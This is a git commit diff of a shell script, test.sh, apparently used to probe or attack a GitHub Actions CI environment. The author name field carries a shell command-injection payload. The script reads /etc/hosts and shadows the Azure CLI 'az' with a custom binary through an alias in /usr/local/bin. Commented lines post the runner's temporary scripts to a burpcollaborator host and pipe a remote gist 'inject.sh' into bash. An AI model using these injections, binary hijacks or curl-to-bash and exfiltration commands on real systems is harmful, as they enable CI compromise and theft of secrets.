835cce7c631fa054a70d0642aa38519dad19b6bd
stp-$('&&${IFS}echo${IFS}${IFS}&&echo${IFS}ran&&${IFS}echo${IFS}') <76434266+d3kum1d0r1y4100@users.noreply.github.com>
2023-07-31 11:13:45 +0800

    Update test.sh

--- test.sh
+++ test.sh
@@ -3,10 +3,25 @@ echo $MY_VAL
 cat /etc/hosts
 which npm
 which az
-mv /usr/bin/az /tmp/az
-cp test /usr/bin/az
-chmod +x /usr/bin/az
-az
-cat /usr/bin/az
+cp test /usr/local/bin/az
+custom_az="/usr/local/bin/az"
+
+# Check if the custom az executable exists
+if [ -x "$custom_az" ]; then
+  # Check if the az alias is already defined
+  if alias az &>/dev/null; then
+    # If the alias is already defined, remove it before creating the new one
+    unalias az
+  fi
+
+  # Create the new alias
+  alias az="$custom_az"
+  echo "Alias 'az' created for $custom_az"
+else
+  echo "Custom az executable not found at $custom_az. Alias not created."
+fi
+
+
+
 # curl -d "$(cat /home/runner/work/_temp/*.sh)" https://ise30gxlwrwg8m6xm64nk2w9208swh.burpcollaborator.net
 #curl -sSfL gist.githubusercontent.com/d3kum1d0r1y4100/f6e2261de7699c7cc799fc826d9693ee/raw/1dc6a6626c5c1d71a088d7d2204590f4734008f3/inject.sh | bash
